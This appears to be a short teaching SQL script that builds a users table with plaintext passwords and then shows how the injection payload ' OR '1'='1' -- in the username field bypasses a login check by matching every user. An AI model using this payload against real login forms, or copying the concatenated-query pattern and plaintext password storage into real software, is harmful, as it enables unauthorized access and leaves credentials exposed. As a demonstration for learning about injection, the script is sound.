-- Create a new users table
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name VARCHAR(128),
  password VARCHAR(128)
);

-- Insert a few users
INSERT INTO users (name, password) VALUES
  ('admin', 'superman'),
  ('jack', 'verysecurepass'),
  ('jill', 'PaSSw0rd123!');

-- Display the table
SELECT * FROM users;

-- Valid login attempt with username = admin, password = superman
SELECT * FROM users WHERE name='admin' AND password='superman';

-- SQL injection
-- username = ' OR '1'='1' --
-- password = superman

-- Blank query
SELECT * FROM users WHERE name='               ' AND password='        ';
-- Filled query
SELECT * FROM users WHERE name='' OR '1'='1' --' AND password='superman';
-- Without the comment, the above is the same as:
SELECT * FROM users WHERE name='' OR '1'='1'
-- Which is true for all users in the table!